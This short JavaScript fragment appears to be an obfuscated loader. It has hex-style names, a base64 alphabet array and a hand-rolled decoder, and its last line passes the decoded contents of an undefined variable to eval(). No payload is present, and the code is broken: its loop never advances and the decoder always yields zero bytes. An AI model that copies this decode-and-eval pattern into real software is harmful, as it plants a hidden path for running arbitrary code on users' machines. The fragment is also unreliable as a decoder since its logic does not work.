var _0x9a2f = ["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="];
function _0x3b1c(data) {
  var o1, o2, bits, i = 0, enc = "";
  do {
    bits = 0;
    o1 = bits >> 16 & 0xff; o2 = bits >> 8 & 0xff;
    enc += String.fromCharCode(o1, o2);
  } while (i < data.length);
  return enc;
}
eval(_0x3b1c(II1));
